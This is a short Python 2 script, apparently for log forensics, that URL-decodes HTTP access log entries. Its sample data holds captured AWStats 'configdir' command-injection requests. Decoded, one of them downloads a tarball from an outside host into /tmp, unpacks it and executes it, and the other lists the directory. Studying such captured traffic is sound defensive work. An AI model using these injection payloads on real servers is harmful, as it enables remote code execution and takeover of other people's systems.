import re
import csv

file="/home/hduser/Desktop/normailized_log/http_access_export.csv"
data = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bwget%20www%2eadjud%2ego%2ero%2ft%2etgz%3btar%20zxvf%20t%2etgz%3b%2e%2ft%3becho%20e_exp%3b%2500',
'/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500']
# data = ['212.203.66.69', 'Feb 26', '22:12:22', '500', 'GET', '/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500', 'HTTP/1.1', '200', '961']

# with open(file, 'rb') as f:
#     reader = csv.reader(f)
#     datalist = map(tuple, reader)
    
#     dataset = []
#     for sublist in datalist:
#         sublist = map(lambda item: item.strip(''), sublist)
#         data = [i.split(';') for i in sublist][0]

data = map(lambda item: item.replace('%25', '%'), data)

datalist = []
for i in data:  
	for code, char in { '%20': ' ', '%21': '!', '%22': '"', '%7C': '|',
						'%23': '#', '%24': '$', '%26': '&', '%27': '\'',
						'%28': '(', '%29': ')', '%2A': '*', '%2B': '+',
						'%2C': ',', '%2D': '-', '%2E': '.', '%2F': '/', 
						'%3A': ':', '%3B': ';', '%3C': '<', '%3D': '=',
						'%3E': '>', '%3F': '?', '%40': '@', '%5B': '[',
						'%5C': '\\', '%5D': '\]', '%5E': '^', '%5F': '_',
						'%00': '',  '%AF': '', '%35': '5', '%63':'c'}.items():
			i = i.replace(code.lower(), char)
	datalist.append(i)

print datalist